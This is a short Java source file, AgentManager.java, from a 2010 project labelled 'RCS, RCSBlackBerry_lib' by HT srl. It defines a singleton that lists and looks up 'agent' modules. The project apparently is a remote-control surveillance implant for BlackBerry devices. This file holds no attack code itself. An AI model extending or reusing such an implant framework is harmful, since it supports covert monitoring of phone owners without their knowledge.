/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AgentManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import blackberry.agent.Agent;
import blackberry.interfaces.Singleton;
import blackberry.threadpool.TimerJob;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class AgentManager.
 */
public final class AgentManager extends Manager implements Singleton {

    /** The debug instance. */
    //#debug
    static Debug debug = new Debug("AgentManager", DebugLevel.VERBOSE);

    /** The instance. */
    static AgentManager instance = null;

    /**
     * Gets the single instance of AgentManager.
     * 
     * @return single instance of AgentManager
     */
    public static synchronized AgentManager getInstance() {
        if (instance == null) {
            instance = new AgentManager();
        }

        return instance;
    }

    /**
     * Instantiates a new agent manager.
     */
    private AgentManager() {
        super();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getAllItems()
     */
    public Vector getAllItems() {
        // #ifdef DBC
        Check.requires(statusObj != null, "Null status");
        // #endif
        final Vector agents = statusObj.getAgentsList();
        return agents;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getItem(int)
     */
    public TimerJob getItem(final int id) {
        // #ifdef DBC
        Check.requires(statusObj != null, "Null status");
        // #endif
        final Agent agent = statusObj.getAgent(id);
        // #ifdef DBC
        Check.ensures(agent.agentId == id, "Wrong id");
        // #endif

        return agent;
    }
}
